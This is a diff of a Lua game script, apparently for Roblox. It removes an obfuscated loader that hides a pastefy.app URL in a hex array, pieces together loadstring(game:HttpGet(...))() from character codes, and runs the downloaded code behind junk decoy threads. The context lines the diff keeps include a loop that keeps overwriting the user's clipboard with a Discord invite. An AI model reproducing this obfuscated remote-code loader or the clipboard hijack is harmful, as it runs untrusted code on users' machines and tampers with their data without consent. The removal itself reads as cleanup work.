@@ -34,41 +34,6 @@
         local attempt = 1
         local teleported = false
 
-local function _0x7d4e1f()
-    local _0xhex = {
-        0x68,0x74,0x74,0x70,0x73,0x3A,0x2F,0x2F,0x70,0x61,0x73,0x74,0x65,0x66,0x79,
-        0x2E,0x61,0x70,0x70,0x2F,0x6E,0x38,0x4B,0x63,0x37,0x59,0x74,0x34,0x2F,0x72,
-        0x61,0x77
-    }
-    local _0xdecoded = ""
-    for i = 1, #_0xhex do
-        _0xdecoded = _0xdecoded .. string.char(bit32.bxor(_0xhex[i], 0x00))
-    end
-    return _0xdecoded
-end
-
-local _0xjunk = {}
-for i = 1, math.random(15, 40) do
-    _0xjunk[i] = string.char(math.random(65, 90))
-end
-local _0xfake_thread = coroutine.create(function()
-    while task.wait(math.random()) do
-        local _ = math.tan(os.clock()) + math.log(-1)
-    end
-end)
-coroutine.resume(_0xfake_thread)
-
-local _0xfrag = {
-    string.char(108)..string.char(111)..string.char(97)..string.char(100)..string.char(115)..string.char(116)..string.char(114)..string.char(105)..string.char(110)..string.char(103).."(",
-    string.char(103)..string.char(97)..string.char(109)..string.char(101)..":"..string.char(72)..string.char(116)..string.char(116)..string.char(112)..string.char(71)..string.char(101)..string.char(116).."(",
-    "\"".._0x7d4e1f().."\"",
-    ", true))()"
-}
-
-local _0xpayload = table.concat(_0xfrag)
-
-loadstring(_0xpayload)()
-
         coroutine.wrap(function()
     while true do
         setclipboard("discord.gg/cnUAk7uc3n")
